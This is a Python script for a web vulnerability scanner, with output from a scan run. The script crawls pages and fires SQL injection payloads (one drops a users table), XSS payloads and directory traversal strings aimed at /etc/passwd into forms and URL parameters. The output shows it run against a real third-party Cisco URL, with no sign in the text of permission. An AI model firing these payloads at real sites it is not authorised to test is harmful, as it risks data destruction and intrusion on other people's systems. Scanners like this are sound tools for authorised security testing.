import requests
import re
import urllib.parse
from bs4 import BeautifulSoup
import time
import json
from typing import List, Dict, Tuple, Optional
import warnings
from urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings for testing purposes
warnings.filterwarnings('ignore', category=InsecureRequestWarning)

class WebVulnerabilityScanner:
    def __init__(self, target_url: str, timeout: int = 10):
        """
        Initialize the vulnerability scanner

        Args:
            target_url: The base URL to scan
            timeout: Request timeout in seconds
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []

        # SQL Injection payloads
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 'a'='a",
            "1' OR '1'='1' #",
            "admin'--",
            "' OR 1=1 LIMIT 1--",
            "') OR ('1'='1",
            "' OR (SELECT COUNT(*) FROM users) > 0--"
        ]

        # XSS payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "'\"><script>alert('XSS')</script>"
        ]

        # SQL error patterns
        self.sql_errors = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"ORA-[0-9]{4,5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"SQLServer JDBC Driver",
            r"SqlException",
            r"SQLite.*error",
            r"sqlite3.OperationalError",
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"Unclosed quotation mark after the character string"
        ]

    def make_request(self, url: str, method: str = 'GET', data: Dict = None,
                    params: Dict = None) -> Optional[requests.Response]:
        """
        Make HTTP request with error handling
        """
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, params=params, timeout=self.timeout,
                                          verify=False, allow_redirects=True)
            elif method.upper() == 'POST':
                response = self.session.post(url, data=data, timeout=self.timeout,
                                           verify=False, allow_redirects=True)
            return response
        except requests.exceptions.RequestException as e:
            print(f"Request failed for {url}: {str(e)}")
            return None

    def find_forms(self, url: str) -> List[Dict]:
        """
        Find all forms on a webpage
        """
        forms = []
        response = self.make_request(url)

        if not response:
            return forms

        soup = BeautifulSoup(response.text, 'html.parser')

        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'GET').upper(),
                'inputs': []
            }

            # Handle relative URLs
            if form_data['action']:
                if form_data['action'].startswith('/'):
                    form_data['action'] = self.target_url + form_data['action']
                elif not form_data['action'].startswith('http'):
                    form_data['action'] = url + '/' + form_data['action']
            else:
                form_data['action'] = url

            # Find all input fields
            for input_field in form.find_all(['input', 'textarea', 'select']):
                input_data = {
                    'name': input_field.get('name', ''),
                    'type': input_field.get('type', 'text'),
                    'value': input_field.get('value', '')
                }
                if input_data['name']:
                    form_data['inputs'].append(input_data)

            forms.append(form_data)

        return forms

    def test_sql_injection(self, url: str) -> List[Dict]:
        """
        Test for SQL injection vulnerabilities
        """
        vulnerabilities = []

        # Test URL parameters
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)

            for param_name in params:
                for payload in self.sql_payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]

                    # Flatten the parameters
                    flat_params = {k: v[0] if isinstance(v, list) else v
                                 for k, v in test_params.items()}

                    response = self.make_request(url, params=flat_params)

                    if response and self.check_sql_errors(response.text):
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'location': 'URL Parameter',
                            'parameter': param_name,
                            'payload': payload,
                            'url': url,
                            'method': 'GET',
                            'severity': 'High'
                        })
                        break  # Found vulnerability, move to next parameter

        # Test forms
        forms = self.find_forms(url)
        for form in forms:
            for payload in self.sql_payloads:
                form_data = {}

                for input_field in form['inputs']:
                    if input_field['type'] not in ['submit', 'button', 'reset']:
                        form_data[input_field['name']] = payload

                if form_data:
                    response = self.make_request(form['action'], method=form['method'],
                                               data=form_data)

                    if response and self.check_sql_errors(response.text):
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'location': 'Form Input',
                            'form_action': form['action'],
                            'payload': payload,
                            'url': url,
                            'method': form['method'],
                            'severity': 'High'
                        })
                        break  # Found vulnerability, move to next form

        return vulnerabilities

    def check_sql_errors(self, response_text: str) -> bool:
        """
        Check if response contains SQL error messages
        """
        for error_pattern in self.sql_errors:
            if re.search(error_pattern, response_text, re.IGNORECASE):
                return True
        return False

    def test_xss(self, url: str) -> List[Dict]:
        """
        Test for XSS vulnerabilities
        """
        vulnerabilities = []

        # Test URL parameters
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)

            for param_name in params:
                for payload in self.xss_payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]

                    # Flatten the parameters
                    flat_params = {k: v[0] if isinstance(v, list) else v
                                 for k, v in test_params.items()}

                    response = self.make_request(url, params=flat_params)

                    if response and payload in response.text:
                        vulnerabilities.append({
                            'type': 'Cross-Site Scripting (XSS)',
                            'location': 'URL Parameter',
                            'parameter': param_name,
                            'payload': payload,
                            'url': url,
                            'method': 'GET',
                            'severity': 'Medium'
                        })

        # Test forms
        forms = self.find_forms(url)
        for form in forms:
            for payload in self.xss_payloads:
                form_data = {}

                for input_field in form['inputs']:
                    if input_field['type'] not in ['submit', 'button', 'reset']:
                        form_data[input_field['name']] = payload

                if form_data:
                    response = self.make_request(form['action'], method=form['method'],
                                               data=form_data)

                    if response and payload in response.text:
                        vulnerabilities.append({
                            'type': 'Cross-Site Scripting (XSS)',
                            'location': 'Form Input',
                            'form_action': form['action'],
                            'payload': payload,
                            'url': url,
                            'method': form['method'],
                            'severity': 'Medium'
                        })

        return vulnerabilities

    def check_security_headers(self, url: str) -> List[Dict]:
        """
        Check for missing security headers
        """
        vulnerabilities = []
        response = self.make_request(url)

        if not response:
            return vulnerabilities

        security_headers = {
            'X-Frame-Options': 'Clickjacking protection',
            'X-XSS-Protection': 'XSS protection',
            'X-Content-Type-Options': 'MIME type sniffing protection',
            'Strict-Transport-Security': 'HTTPS enforcement',
            'Content-Security-Policy': 'Content injection protection',
            'X-Permitted-Cross-Domain-Policies': 'Cross-domain policy'
        }

        for header, description in security_headers.items():
            if header not in response.headers:
                vulnerabilities.append({
                    'type': 'Missing Security Header',
                    'header': header,
                    'description': description,
                    'url': url,
                    'severity': 'Low'
                })

        return vulnerabilities

    def check_directory_traversal(self, url: str) -> List[Dict]:
        """
        Test for directory traversal vulnerabilities
        """
        vulnerabilities = []

        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]

        # Test URL parameters
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)

            for param_name in params:
                for payload in traversal_payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]

                    flat_params = {k: v[0] if isinstance(v, list) else v
                                 for k, v in test_params.items()}

                    response = self.make_request(url, params=flat_params)

                    if response and ('root:' in response.text or
                                   'localhost' in response.text or
                                   '[boot loader]' in response.text.lower()):
                        vulnerabilities.append({
                            'type': 'Directory Traversal',
                            'location': 'URL Parameter',
                            'parameter': param_name,
                            'payload': payload,
                            'url': url,
                            'severity': 'High'
                        })

        return vulnerabilities

    def scan_url(self, url: str) -> List[Dict]:
        """
        Perform comprehensive vulnerability scan on a single URL
        """
        print(f"Scanning: {url}")
        vulnerabilities = []

        # Test for SQL Injection
        print("  Testing for SQL Injection...")
        sql_vulns = self.test_sql_injection(url)
        vulnerabilities.extend(sql_vulns)

        # Test for XSS
        print("  Testing for XSS...")
        xss_vulns = self.test_xss(url)
        vulnerabilities.extend(xss_vulns)

        # Check security headers
        print("  Checking security headers...")
        header_vulns = self.check_security_headers(url)
        vulnerabilities.extend(header_vulns)

        # Test for directory traversal
        print("  Testing for directory traversal...")
        traversal_vulns = self.check_directory_traversal(url)
        vulnerabilities.extend(traversal_vulns)

        return vulnerabilities

    def crawl_and_scan(self, max_pages: int = 10) -> List[Dict]:
        """
        Crawl the website and scan multiple pages
        """
        visited_urls = set()
        urls_to_visit = [self.target_url]
        all_vulnerabilities = []

        while urls_to_visit and len(visited_urls) < max_pages:
            current_url = urls_to_visit.pop(0)

            if current_url in visited_urls:
                continue

            visited_urls.add(current_url)

            # Scan current URL
            vulnerabilities = self.scan_url(current_url)
            all_vulnerabilities.extend(vulnerabilities)

            # Find more URLs to scan
            response = self.make_request(current_url)
            if response:
                soup = BeautifulSoup(response.text, 'html.parser')

                for link in soup.find_all('a', href=True):
                    href = link['href']

                    # Convert relative URLs to absolute
                    if href.startswith('/'):
                        full_url = self.target_url + href
                    elif href.startswith('http'):
                        # Only scan URLs from the same domain
                        if self.target_url in href:
                            full_url = href
                        else:
                            continue
                    else:
                        full_url = current_url + '/' + href

                    if full_url not in visited_urls and full_url not in urls_to_visit:
                        urls_to_visit.append(full_url)

            # Add delay to be respectful
            time.sleep(1)

        return all_vulnerabilities

    def generate_report(self, vulnerabilities: List[Dict]) -> str:
        """
        Generate a detailed vulnerability report
        """
        report = []
        report.append("=" * 60)
        report.append("WEB APPLICATION VULNERABILITY SCAN REPORT")
        report.append("=" * 60)
        report.append(f"Target: {self.target_url}")
        report.append(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"Total Vulnerabilities Found: {len(vulnerabilities)}")
        report.append("")

        # Group vulnerabilities by severity
        severity_groups = {'High': [], 'Medium': [], 'Low': []}
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'Low')
            severity_groups[severity].append(vuln)

        for severity in ['High', 'Medium', 'Low']:
            if severity_groups[severity]:
                report.append(f"{severity.upper()} SEVERITY VULNERABILITIES ({len(severity_groups[severity])})")
                report.append("-" * 40)

                for i, vuln in enumerate(severity_groups[severity], 1):
                    report.append(f"{i}. {vuln['type']}")
                    report.append(f"   URL: {vuln.get('url', 'N/A')}")

                    if 'location' in vuln:
                        report.append(f"   Location: {vuln['location']}")

                    if 'parameter' in vuln:
                        report.append(f"   Parameter: {vuln['parameter']}")

                    if 'payload' in vuln:
                        report.append(f"   Payload: {vuln['payload']}")

                    if 'header' in vuln:
                        report.append(f"   Missing Header: {vuln['header']}")
                        report.append(f"   Description: {vuln['description']}")

                    report.append("")

                report.append("")

        # Summary and recommendations
        report.append("RECOMMENDATIONS")
        report.append("-" * 20)

        if any(v['type'] == 'SQL Injection' for v in vulnerabilities):
            report.append("• Implement parameterized queries/prepared statements")
            report.append("• Validate and sanitize all user inputs")
            report.append("• Use least privilege database accounts")

        if any(v['type'] == 'Cross-Site Scripting (XSS)' for v in vulnerabilities):
            report.append("• Implement proper input validation and output encoding")
            report.append("• Use Content Security Policy (CSP) headers")
            report.append("• Sanitize user inputs before displaying")

        if any(v['type'] == 'Missing Security Header' for v in vulnerabilities):
            report.append("• Implement security headers (X-Frame-Options, CSP, etc.)")
            report.append("• Enable HTTPS and HSTS")

        if any(v['type'] == 'Directory Traversal' for v in vulnerabilities):
            report.append("• Validate file paths and restrict file access")
            report.append("• Use whitelist approach for file operations")

        return "\n".join(report)

def main():
    """
    Main function to demonstrate the vulnerability scanner
    """
    print("Web Application Vulnerability Scanner")
    print("=" * 40)

    # Example usage - replace with actual target URL
    target_url = input("Enter target URL (e.g., http://example.com): ").strip()

    if not target_url:
        # Use a test URL for demonstration
        target_url = "http://testphp.vulnweb.com"
        print(f"Using demo target: {target_url}")

    # Initialize scanner
    scanner = WebVulnerabilityScanner(target_url)

    print(f"\nStarting vulnerability scan of: {target_url}")
    print("This may take a few minutes...\n")

    try:
        # Perform the scan
        vulnerabilities = scanner.crawl_and_scan(max_pages=5)

        # Generate and display report
        report = scanner.generate_report(vulnerabilities)
        print(report)

        # Save report to file
        with open('vulnerability_report.txt', 'w') as f:
            f.write(report)

        print(f"\nReport saved to: vulnerability_report.txt")

        # Display summary
        print(f"\nScan completed!")
        print(f"Total vulnerabilities found: {len(vulnerabilities)}")

        if vulnerabilities:
            severity_count = {}
            for vuln in vulnerabilities:
                severity = vuln.get('severity', 'Low')
                severity_count[severity] = severity_count.get(severity, 0) + 1

            for severity, count in severity_count.items():
                print(f"{severity} severity: {count}")

    except KeyboardInterrupt:
        print("\nScan interrupted by user")
    except Exception as e:
        print(f"Error during scan: {str(e)}")

if __name__ == "__main__":
    main()

#**OUTPUT**:

Web Application Vulnerability Scanner
========================================
Enter target URL (e.g., http://example.com): https://umbrella.cisco.com/info/cyber-threat-trends-report?utm_medium=search-paid&utm_source=bing&utm_campaign=UMB_APJC_IN_EN_BS_Nonbrand_Threats_T1&utm_content=DNS-FY24-Q4-Content-Ebook-Cyber-Threat-Trends-Report&_bt=&_bk=security%20threats&_bm=p&_bn=o&_bg=1320515912284743&msclkid=10cf290025ca1b41ae524136f7af7da8

Starting vulnerability scan of: https://umbrella.cisco.com/info/cyber-threat-trends-report?utm_medium=search-paid&utm_source=bing&utm_campaign=UMB_APJC_IN_EN_BS_Nonbrand_Threats_T1&utm_content=DNS-FY24-Q4-Content-Ebook-Cyber-Threat-Trends-Report&_bt=&_bk=security%20threats&_bm=p&_bn=o&_bg=1320515912284743&msclkid=10cf290025ca1b41ae524136f7af7da8
This may take a few minutes...

Scanning: https://umbrella.cisco.com/info/cyber-threat-trends-report?utm_medium=search-paid&utm_source=bing&utm_campaign=UMB_APJC_IN_EN_BS_Nonbrand_Threats_T1&utm_content=DNS-FY24-Q4-Content-Ebook-Cyber-Threat-Trends-Report&_bt=&_bk=security%20threats&_bm=p&_bn=o&_bg=1320515912284743&msclkid=10cf290025ca1b41ae524136f7af7da8
  Testing for SQL Injection...
  Testing for XSS...
  Checking security headers...
  Testing for directory traversal...
Scanning: https://umbrella.cisco.com/info/cyber-threat-trends-report?utm_medium=search-paid&utm_source=bing&utm_campaign=UMB_APJC_IN_EN_BS_Nonbrand_Threats_T1&utm_content=DNS-FY24-Q4-Content-Ebook-Cyber-Threat-Trends-Report&_bt=&_bk=security%20threats&_bm=p&_bn=o&_bg=1320515912284743&msclkid=10cf290025ca1b41ae524136f7af7da8/#genesis-nav-primary
  Testing for SQL Injection...
  Testing for XSS...
  Checking security headers...
  Testing for directory traversal...
Scanning: https://umbrella.cisco.com/info/cyber-threat-trends-report?utm_medium=search-paid&utm_source=bing&utm_campaign=UMB_APJC_IN_EN_BS_Nonbrand_Threats_T1&utm_content=DNS-FY24-Q4-Content-Ebook-Cyber-Threat-Trends-Report&_bt=&_bk=security%20threats&_bm=p&_bn=o&_bg=1320515912284743&msclkid=10cf290025ca1b41ae524136f7af7da8/#genesis-content
  Testing for SQL Injection...
  Testing for XSS...
  Checking security headers...
  Testing for directory traversal...
Scanning: https://umbrella.cisco.com/info/cyber-threat-trends-report?utm_medium=search-paid&utm_source=bing&utm_campaign=UMB_APJC_IN_EN_BS_Nonbrand_Threats_T1&utm_content=DNS-FY24-Q4-Content-Ebook-Cyber-Threat-Trends-Report&_bt=&_bk=security%20threats&_bm=p&_bn=o&_bg=1320515912284743&msclkid=10cf290025ca1b41ae524136f7af7da8/#genesis-footer-widgets
  Testing for SQL Injection...
  Testing for XSS...
  Checking security headers...
  Testing for directory traversal...
Scanning: https://umbrella.cisco.com/info/cyber-threat-trends-report?utm_medium=search-paid&utm_source=bing&utm_campaign=UMB_APJC_IN_EN_BS_Nonbrand_Threats_T1&utm_content=DNS-FY24-Q4-Content-Ebook-Cyber-Threat-Trends-Report&_bt=&_bk=security%20threats&_bm=p&_bn=o&_bg=1320515912284743&msclkid=10cf290025ca1b41ae524136f7af7da8/#
  Testing for SQL Injection...
  Testing for XSS...
  Checking security headers...
  Testing for directory traversal...
============================================================
WEB APPLICATION VULNERABILITY SCAN REPORT
============================================================
Target: https://umbrella.cisco.com/info/cyber-threat-trends-report?utm_medium=search-paid&utm_source=bing&utm_campaign=UMB_APJC_IN_EN_BS_Nonbrand_Threats_T1&utm_content=DNS-FY24-Q4-Content-Ebook-Cyber-Threat-Trends-Report&_bt=&_bk=security%20threats&_bm=p&_bn=o&_bg=1320515912284743&msclkid=10cf290025ca1b41ae524136f7af7da8
Scan Date: 2025-05-28 09:13:27
Total Vulnerabilities Found: 10

LOW SEVERITY VULNERABILITIES (10)
----------------------------------------
1. Missing Security Header
   URL: https://umbrella.cisco.com/info/cyber-threat-trends-report?utm_medium=search-paid&utm_source=bing&utm_campaign=UMB_APJC_IN_EN_BS_Nonbrand_Threats_T1&utm_content=DNS-FY24-Q4-Content-Ebook-Cyber-Threat-Trends-Report&_bt=&_bk=security%20threats&_bm=p&_bn=o&_bg=1320515912284743&msclkid=10cf290025ca1b41ae524136f7af7da8
   Missing Header: Strict-Transport-Security
   Description: HTTPS enforcement

2. Missing Security Header
   URL: https://umbrella.cisco.com/info/cyber-threat-trends-report?utm_medium=search-paid&utm_source=bing&utm_campaign=UMB_APJC_IN_EN_BS_Nonbrand_Threats_T1&utm_content=DNS-FY24-Q4-Content-Ebook-Cyber-Threat-Trends-Report&_bt=&_bk=security%20threats&_bm=p&_bn=o&_bg=1320515912284743&msclkid=10cf290025ca1b41ae524136f7af7da8
   Missing Header: X-Permitted-Cross-Domain-Policies
   Description: Cross-domain policy

3. Missing Security Header
   URL: https://umbrella.cisco.com/info/cyber-threat-trends-report?utm_medium=search-paid&utm_source=bing&utm_campaign=UMB_APJC_IN_EN_BS_Nonbrand_Threats_T1&utm_content=DNS-FY24-Q4-Content-Ebook-Cyber-Threat-Trends-Report&_bt=&_bk=security%20threats&_bm=p&_bn=o&_bg=1320515912284743&msclkid=10cf290025ca1b41ae524136f7af7da8/#genesis-nav-primary
   Missing Header: Strict-Transport-Security
   Description: HTTPS enforcement

4. Missing Security Header
   URL: https://umbrella.cisco.com/info/cyber-threat-trends-report?utm_medium=search-paid&utm_source=bing&utm_campaign=UMB_APJC_IN_EN_BS_Nonbrand_Threats_T1&utm_content=DNS-FY24-Q4-Content-Ebook-Cyber-Threat-Trends-Report&_bt=&_bk=security%20threats&_bm=p&_bn=o&_bg=1320515912284743&msclkid=10cf290025ca1b41ae524136f7af7da8/#genesis-nav-primary
   Missing Header: X-Permitted-Cross-Domain-Policies
   Description: Cross-domain policy

5. Missing Security Header
   URL: https://umbrella.cisco.com/info/cyber-threat-trends-report?utm_medium=search-paid&utm_source=bing&utm_campaign=UMB_APJC_IN_EN_BS_Nonbrand_Threats_T1&utm_content=DNS-FY24-Q4-Content-Ebook-Cyber-Threat-Trends-Report&_bt=&_bk=security%20threats&_bm=p&_bn=o&_bg=1320515912284743&msclkid=10cf290025ca1b41ae524136f7af7da8/#genesis-content
   Missing Header: Strict-Transport-Security
   Description: HTTPS enforcement

6. Missing Security Header
   URL: https://umbrella.cisco.com/info/cyber-threat-trends-report?utm_medium=search-paid&utm_source=bing&utm_campaign=UMB_APJC_IN_EN_BS_Nonbrand_Threats_T1&utm_content=DNS-FY24-Q4-Content-Ebook-Cyber-Threat-Trends-Report&_bt=&_bk=security%20threats&_bm=p&_bn=o&_bg=1320515912284743&msclkid=10cf290025ca1b41ae524136f7af7da8/#genesis-content
   Missing Header: X-Permitted-Cross-Domain-Policies
   Description: Cross-domain policy

7. Missing Security Header
   URL: https://umbrella.cisco.com/info/cyber-threat-trends-report?utm_medium=search-paid&utm_source=bing&utm_campaign=UMB_APJC_IN_EN_BS_Nonbrand_Threats_T1&utm_content=DNS-FY24-Q4-Content-Ebook-Cyber-Threat-Trends-Report&_bt=&_bk=security%20threats&_bm=p&_bn=o&_bg=1320515912284743&msclkid=10cf290025ca1b41ae524136f7af7da8/#genesis-footer-widgets
   Missing Header: Strict-Transport-Security
   Description: HTTPS enforcement

8. Missing Security Header
   URL: https://umbrella.cisco.com/info/cyber-threat-trends-report?utm_medium=search-paid&utm_source=bing&utm_campaign=UMB_APJC_IN_EN_BS_Nonbrand_Threats_T1&utm_content=DNS-FY24-Q4-Content-Ebook-Cyber-Threat-Trends-Report&_bt=&_bk=security%20threats&_bm=p&_bn=o&_bg=1320515912284743&msclkid=10cf290025ca1b41ae524136f7af7da8/#genesis-footer-widgets
   Missing Header: X-Permitted-Cross-Domain-Policies
   Description: Cross-domain policy

9. Missing Security Header
   URL: https://umbrella.cisco.com/info/cyber-threat-trends-report?utm_medium=search-paid&utm_source=bing&utm_campaign=UMB_APJC_IN_EN_BS_Nonbrand_Threats_T1&utm_content=DNS-FY24-Q4-Content-Ebook-Cyber-Threat-Trends-Report&_bt=&_bk=security%20threats&_bm=p&_bn=o&_bg=1320515912284743&msclkid=10cf290025ca1b41ae524136f7af7da8/#
   Missing Header: Strict-Transport-Security
   Description: HTTPS enforcement

10. Missing Security Header
   URL: https://umbrella.cisco.com/info/cyber-threat-trends-report?utm_medium=search-paid&utm_source=bing&utm_campaign=UMB_APJC_IN_EN_BS_Nonbrand_Threats_T1&utm_content=DNS-FY24-Q4-Content-Ebook-Cyber-Threat-Trends-Report&_bt=&_bk=security%20threats&_bm=p&_bn=o&_bg=1320515912284743&msclkid=10cf290025ca1b41ae524136f7af7da8/#
   Missing Header: X-Permitted-Cross-Domain-Policies
   Description: Cross-domain policy


RECOMMENDATIONS
--------------------
• Implement security headers (X-Frame-Options, CSP, etc.)
• Enable HTTPS and HSTS

Report saved to: vulnerability_report.txt

Scan completed!
Total vulnerabilities found: 10
Low severity: 10
